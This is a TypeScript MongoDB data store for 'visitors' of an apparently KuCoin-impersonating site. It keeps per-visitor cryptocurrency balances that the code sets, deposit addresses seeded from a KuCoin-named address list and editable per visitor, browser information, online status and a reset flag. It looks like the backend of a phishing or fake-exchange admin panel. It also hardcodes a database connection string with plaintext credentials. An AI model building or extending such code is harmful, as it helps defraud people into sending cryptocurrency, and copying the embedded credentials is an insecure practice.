import mongoose, { Schema, Document } from "mongoose";
import { coinAddresses } from "../kucoin-addresses";

const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://rumman:rumman@cluster0.h6zl6r5.mongodb.net/kucoin?retryWrites=true&w=majority&appName=Cluster0";

// --- MongoDB Connection ---
async function connectDB() {
  if (mongoose.connection.readyState >= 1) return;
  await mongoose.connect(MONGODB_URI, { dbName: "kucoin" });
}

// --- Types ---
interface CryptoBalance {
  quantity: string;
  eurBalance: string;
  percentageChange: string;
}

export interface IVisitor extends Document {
  id: string;
  name: string;
  balances: Record<string, CryptoBalance>;
  resetRequested: boolean;
  selectedCryptos: string[];
  cryptoAddresses: Record<string, string>;
  isOnline: boolean;
  browserInfo: string | null;
  lastSeen: number;
}

// --- Schema ---
const VisitorSchema = new Schema<IVisitor>({
  id: { type: String, required: true, unique: true },
  name: String,
  balances: { type: Object, default: {} },
  resetRequested: { type: Boolean, default: false },
  selectedCryptos: [String],
  cryptoAddresses: { type: Object, default: {} },
  isOnline: { type: Boolean, default: false },
  browserInfo: { type: String, default: null },
  lastSeen: { type: Number, default: Date.now },
});

const VisitorModel =
  mongoose.models.Visitor || mongoose.model<IVisitor>("Visitor", VisitorSchema);

// --- Store Class ---
class MongoVisitorStore {
  private visitorCounter: number = 0;

  async loadData() {
    await connectDB();
    this.visitorCounter = await VisitorModel.countDocuments();
  }

  async getVisitor(visitorId: string): Promise<IVisitor | null> {
    await connectDB();
    return VisitorModel.findOne({ id: visitorId });
  }

  async addVisitor(visitorId: string): Promise<IVisitor> {
    await connectDB();
    this.visitorCounter++;
    const visitorName = `Visitor ${this.visitorCounter}`;
    const defaultAddresses: Record<string, string> = {};
    for (const [cryptoId, address] of Object.entries(coinAddresses)) {
      defaultAddresses[cryptoId] = address;
    }
    const newVisitor = new VisitorModel({
      id: visitorId,
      name: visitorName,
      balances: {},
      resetRequested: false,
      selectedCryptos: [],
      cryptoAddresses: defaultAddresses,
      isOnline: true,
      browserInfo: null,
      lastSeen: Date.now(),
    });
    await newVisitor.save();
    return newVisitor;
  }

  async updateBalance(
    visitorId: string,
    cryptoId: string,
    quantity: string,
    eurBalance: string,
    percentageChange: string
  ): Promise<IVisitor | null> {
    await connectDB();
    const visitor = await VisitorModel.findOne({ id: visitorId });
    if (visitor) {
      if (!visitor.balances || typeof visitor.balances !== "object") {
        visitor.balances = {};
      }
      visitor.balances[cryptoId] = { quantity, eurBalance, percentageChange };
      visitor.markModified("balances"); // <-- This is the key fix!
      visitor.lastSeen = Date.now();
      await visitor.save();
      return visitor;
    }
    return null;
  }

  async updateSelectedCryptos(
    visitorId: string,
    cryptos: string[]
  ): Promise<IVisitor | null> {
    await connectDB();
    const visitor = await VisitorModel.findOne({ id: visitorId });
    if (visitor) {
      visitor.selectedCryptos = cryptos;
      visitor.lastSeen = Date.now();
      await visitor.save();
      return visitor;
    }
    return null;
  }

  async updateCryptoAddress(
    visitorId: string,
    cryptoId: string,
    address: string
  ): Promise<IVisitor | null> {
    await connectDB();
    const visitor = await VisitorModel.findOne({ id: visitorId });
    if (visitor) {
      visitor.cryptoAddresses[cryptoId] = address;
      visitor.lastSeen = Date.now();
      await visitor.save();
      return visitor;
    }
    return null;
  }

  async updateOnlineStatusAndBrowserInfo(
    visitorId: string,
    isOnline: boolean,
    browserInfo: string | null
  ): Promise<IVisitor | null> {
    await connectDB();
    const visitor = await VisitorModel.findOne({ id: visitorId });
    if (visitor) {
      visitor.isOnline = isOnline;
      visitor.browserInfo = browserInfo;
      visitor.lastSeen = Date.now();
      await visitor.save();
      return visitor;
    }
    return null;
  }

  async markVisitorForReset(visitorId: string): Promise<boolean> {
    await connectDB();
    const visitor = await VisitorModel.findOne({ id: visitorId });
    if (visitor) {
      visitor.resetRequested = true;
      visitor.lastSeen = Date.now();
      visitor.markModified("resetRequested");
      await visitor.save();
      return true;
    }
    return false;
  }

  async deleteVisitor(visitorId: string): Promise<boolean> {
    await connectDB();
    const result = await VisitorModel.deleteOne({ id: visitorId });
    return result.deletedCount > 0;
  }

  // Clean up old offline visitors (older than 2 days)
  private async cleanupOldVisitors() {
    const twoDaysAgo = Date.now() - 2 * 24 * 60 * 60 * 1000;
    await VisitorModel.deleteMany({
      isOnline: false,
      lastSeen: { $lt: twoDaysAgo },
    });
  }

  // Only return visitors who are online OR (offline but lastSeen within 2 minutes)
  async getAllVisitors(): Promise<any[]> {
    await connectDB();
    await this.cleanupOldVisitors();

    const twoMinutesAgo = Date.now() - 2 * 60 * 1000;
    return VisitorModel.find({
      $or: [
        { isOnline: true },
        { isOnline: false, lastSeen: { $gte: twoMinutesAgo } },
      ],
    }).lean();
  }
}

// Export singleton instance
export const visitorStore = new MongoVisitorStore();
